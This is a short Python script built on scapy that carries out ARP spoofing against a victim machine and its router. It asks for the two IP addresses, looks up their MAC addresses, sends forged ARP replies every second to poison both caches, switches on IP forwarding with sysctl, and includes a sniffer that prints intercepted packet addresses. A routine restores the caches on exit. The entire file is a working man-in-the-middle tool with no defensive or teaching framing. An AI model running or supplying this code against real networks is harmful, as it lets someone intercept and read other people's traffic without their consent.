import os
import sys
from scapy.all import *
from scapy.layers.l2 import arping

interface = "wlp3s0"
victimIP = input("victim: \n")
routerIP = input("router: \n")


def MACsnag(IP):
    ans, uans = arping(IP)
    for s, r in ans:
        return r[Ether].src


victimMAC = None
routerMAC = None


def MAC():
    loop = True
    while loop:
        global victimMAC
        global routerMAC
        victimMAC = MACsnag(victimIP)
        routerMAC = MACsnag(routerIP)

        print("\nMAC ADDRESS OBTAINED")
        print(victimMAC)
        print(routerMAC, '\n')

        if victimMAC is not None and routerMAC is not None:
            loop = False
            print("[*] MAC Addresses obtain sucessfully!")
        else:
            print("[!] Error obtaining MAC Addresses, trying again!")


def spoof(routerIP, victimIP):
    print("Router mac: \'", routerMAC, '\'')
    print("Victim mac: \'", victimMAC, '\'')

    # Sends the arp replies
    #
    #   "op = 2" - '2' is the opcode for a reply

    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))


def restore(routerIP, victimIP):
    # Restores the original config
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=4)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=4)


def sniffer():
    pkts = sniff(iface=interface, count=10, prn=lambda
        x: x.sprintf(" "
                        "=================================================================\n"
                        "Source: %IP.src% : %Ether.src%,\n "
                        "Reciever: %IP.dst% \n "
                        "=================================================================\n"
                     ))


# TODO: Not sure packets are being forwarded correctly?
def set_ip_forward(state):
    if state is True:
        #os.system("sysctl net.ipv4.conf.wlp3s0.forwarding=1")
        os.system("sysctl net.ipv4.ip_forward=1")

    else:
        #os.system("sysctl net.ipv4.conf.wlp3s0.forwarding=0")
        os.system("sysctl net.ipv4.ip_forward=0")



def run():
    set_ip_forward(True)
    spoof(routerIP, victimIP)

    while True:
        try:
            spoof(routerIP, victimIP)
            time.sleep(1)
            #sniffer() # TODO: Just here for debug
        except KeyboardInterrupt:
            restore(routerIP, victimIP)
            set_ip_forward(False)
            sys.exit(0)

MAC()
run()